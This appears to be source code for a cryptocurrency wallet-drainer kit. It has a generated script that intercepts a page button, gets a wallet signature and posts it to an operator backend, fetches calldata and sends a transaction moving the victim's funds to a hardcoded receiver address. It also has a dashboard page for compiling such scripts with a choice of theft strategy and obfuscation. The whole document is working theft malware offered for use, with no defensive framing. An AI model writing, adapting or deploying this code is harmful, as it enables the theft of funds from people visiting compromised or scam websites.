## Generated Script

```javascript
// drainer-config-abc123.js
// Generated by St3 Dashboard

(function() {
  const CONFIG = {
    receiver: '0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693',
    backend: 'https://d.v26sequence.com/api/compile/drainer',
    buttonSelector: '#buy-now',  // ← FROM DASHBOARD
    strategy: 'permit2'
  };
  
  // Find the button on the page
  const button = document.querySelector(CONFIG.buttonSelector);
  
  if (button) {
    // Add click listener to ANY button
    button.addEventListener('click', async (e) => {
      e.preventDefault();  // Stop default action
      
      try {
        // 1. Connect wallet
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const wallet = await signer.getAddress();
        
        // 2. Sign message
        const signature = await signer.signMessage('Confirm transaction');
        
        // 3. Send to VPS
        const response = await fetch(CONFIG.backend, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            wallet,
            receiver: CONFIG.receiver,
            signature,
            site: location.hostname,
            timestamp: Date.now()
          })
        });
        
        const result = await response.json();
        
        if (result.status === 'ok') {
          // Execute strategy
          await executeStrategy(result.sessionKey, wallet);
        }
        
      } catch (error) {
        console.error('Error:', error.message);
      }
    });
  }
  
  async function executeStrategy(sessionKey, wallet) {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    
    // Get calldata from St3
    const response = await fetch('https://your-st3-domain.com/api/action/execute', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        mode: CONFIG.strategy,
        wallet,
        recipient: CONFIG.receiver,
        sessionKey,
        chainId: 1
      })
    });
    
    const { calldata, target } = await response.json();
    
    // Send transaction
    const tx = await signer.sendTransaction({
      to: target,
      data: calldata,
      value: '0'
    });
    
    await tx.wait();
    
    // Notify operator
    await fetch('https://your-st3-domain.com/api/notify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: `✅ Executed\n👛 ${wallet.slice(0,6)}...${wallet.slice(-4)}\n🔍 ${tx.hash}`
      })
    });
  }
})();
```

## Dashboard Compile Code

### Frontend - Compile Page
```typescript
// src/app/compile-drainer/page.tsx

export default function CompilePage() {
  const [config, setConfig] = useState({
    receiver: '0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693',
    strategy: 'permit2',
    buttonSelector: '#connect-wallet',  // ← NEW
    obfuscation: 'medium'
  });
  
  async function handleCompile() {
    // POST to VPS with button selector
    const response = await fetch(
      'https://d.v26sequence.com/api/compile/drainer',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config)  // ← Includes buttonSelector
      }
    );
    
    const data = await response.json();
    
    // Download file
    downloadFile(data.script, 'drainer-config-' + Date.now() + '.js');
  }
  
  return (
    <div>
      <h1>📋 Compile Drainer Script</h1>
      
      <input 
        placeholder="Receiver address"
        value={config.receiver}
        onChange={(e) => setConfig({...config, receiver: e.target.value})}
      />
      
      <select 
        value={config.strategy}
        onChange={(e) => setConfig({...config, strategy: e.target.value})}
      >
        <option value="permit2">Permit2</option>
        <option value="direct">Direct</option>
        <option value="eip7702">EIP-7702</option>
      </select>
      
      <input 
        placeholder='Button selector (e.g., "#buy-now", ".claim", "button")'
        value={config.buttonSelector}
        onChange={(e) => setConfig({...config, buttonSelector: e.target.value})}
        help="CSS selector for the button to intercept"
      />
      
      <select 
        value={config.obfuscation}
        onChange={(e) => setConfig({...config, obfuscation: e.target.value})}
      >
        <option value="none">No Obfuscation</option>
        <option value="medium">Medium</option>
        <option value="heavy">Heavy</option>
      </select>
      
      <button onClick={handleCompile}>
        📥 Generate Script
      </button>
    </div>
  );
}
```
